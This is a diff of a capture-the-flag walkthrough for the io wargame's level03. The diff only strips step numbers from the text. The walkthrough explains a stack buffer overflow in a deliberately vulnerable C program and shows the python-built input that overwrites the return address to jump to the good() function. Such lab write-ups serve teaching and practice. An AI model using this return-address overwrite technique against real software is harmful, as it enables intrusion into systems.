@@ -1,4 +1,4 @@
-1. Start out by looking at the source code in level03.c
+Start out by looking at the source code in level03.c
 ```
 //bla, based on work by beach
  
@@ -33,7 +33,7 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-2. At first glance, we see two functions: good() and bad(). We see they're kind enough to tell us the address of good(), and it seems like we need redirect execution to go there. We need to supply at least one command line argument that's longer than four characters, then it gets mem copied in its entirety into a fixed size buffer of 50 bytes. We need to supply a string long enough to overwrite the return address at the end of the function. To make it easy we can use python to print out a string and figure out how many bytes we need.
+At first glance, we see two functions: good() and bad(). We see they're kind enough to tell us the address of good(), and it seems like we need redirect execution to go there. We need to supply at least one command line argument that's longer than four characters, then it gets mem copied in its entirety into a fixed size buffer of 50 bytes. We need to supply a string long enough to overwrite the return address at the end of the function. To make it easy we can use python to print out a string and figure out how many bytes we need.
 ```
 level3@io:/levels$ ./level03 $(python -c 'print "A"*100')
 This is exciting we're going to (nil)
@@ -58,7 +58,7 @@ This is exciting we're going to 0x42424242
 Segmentation fault
 ```
 
-3. Now that we know how many bytes we need, we need to replace the Bs with the four bytes of the address for the function good() we can return into it. The address is 0x8048474. Because x86 architecture is little endian, we need to reverse the bytes in the memory address in order to actually jump to 0x8048474.
+Now that we know how many bytes we need, we need to replace the Bs with the four bytes of the address for the function good() we can return into it. The address is 0x8048474. Because x86 architecture is little endian, we need to reverse the bytes in the memory address in order to actually jump to 0x8048474.
 ```
 level3@io:/levels$ ./level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')
 This is exciting we're going to 0x8048474
